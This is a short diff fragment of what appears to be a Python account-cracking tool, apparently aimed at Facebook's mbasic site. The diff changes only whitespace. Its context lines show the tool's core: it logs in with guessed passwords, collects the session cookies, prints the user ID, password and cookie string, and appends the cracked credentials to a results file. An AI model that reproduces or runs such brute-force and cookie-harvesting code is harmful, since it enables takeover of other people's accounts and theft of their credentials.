@@ -1678,7 +1678,7 @@ def crackmbasic(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
 				tree.add(f"[ Succes-Login ]").add(f"[bold green]{idf}|{pw}").add(f"[bold green]{kuki}")
-				cetak(tree)
+				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
@@ -1688,6 +1688,7 @@ def crackmbasic(idf,pwv):
 		except requests.exceptions.ConnectionError:
 			time.sleep(31)
 	loop+=1
+	
 #-----------------------[ METHODE FREE ]-------------------#
 def crackfree(idf,pwv):
 	global loop,ok,cp
